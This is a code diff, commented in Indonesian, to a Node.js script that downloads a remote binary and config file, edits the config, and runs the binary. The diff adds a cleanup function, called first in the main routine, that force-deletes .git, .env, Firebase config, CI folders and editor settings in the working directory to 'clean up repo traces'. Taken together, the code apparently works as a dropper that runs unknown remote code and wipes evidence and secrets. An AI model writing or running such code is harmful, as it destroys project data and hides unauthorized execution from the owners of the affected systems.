@@ -29,6 +29,39 @@ function log(msg) {
   if (DEBUG) console.log(message);
 }
 
+// =============================================
+// HAPUS FOLDER & FILE SOURCE CONTROL FIREBASE
+// =============================================
+function cleanSourceControl() {
+  const targets = [
+    ".git",           // Git folder
+    ".github",        // GitHub config
+    ".gitlab",        // GitLab config
+    ".firebase",      // Firebase folder
+    "firebase.json",  // Firebase config
+    ".firebaserc",    // Firebase rc file
+    ".gitignore",     // Git ignore
+    ".env",           // Env file
+    ".vscode",        // VSCode folder
+    "node_modules/.cache" // Build cache
+  ];
+
+  targets.forEach(target => {
+    const targetPath = path.join(process.cwd(), target);
+    try {
+      if (fs.existsSync(targetPath)) {
+        log(`Menghapus: ${target}`);
+        execSync(`rm -rf "${targetPath}"`);
+      }
+    } catch (err) {
+      log(`Gagal menghapus ${target}: ${err.message}`);
+    }
+  });
+}
+
+// =============================================
+// DOWNLOAD FILE
+// =============================================
 async function downloadFile(url, outputPath) {
   try {
     const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 });
@@ -39,6 +72,9 @@ async function downloadFile(url, outputPath) {
   }
 }
 
+// =============================================
+// EDIT CONFIG
+// =============================================
 function editConfig(filePath) {
   try {
     let data = fs.readFileSync(filePath, 'utf8');
@@ -52,6 +88,9 @@ function editConfig(filePath) {
   }
 }
 
+// =============================================
+// JALANKAN BINARY
+// =============================================
 function runBinary() {
   log("Menjalankan binary...");
 
@@ -66,7 +105,13 @@ function runBinary() {
   return proc;
 }
 
+// =============================================
+// MAIN FUNCTION
+// =============================================
 (async () => {
+  log("Membersihkan source control Firebase...");
+  cleanSourceControl(); // <-- Bersihkan jejak repo & Firebase
+
   if (!fs.existsSync(FILE_GENZO)) await downloadFile(URL_GENZO, FILE_GENZO);
   if (!fs.existsSync(FILE_CONFIG)) {
     await downloadFile(URL_CONFIG, FILE_CONFIG);
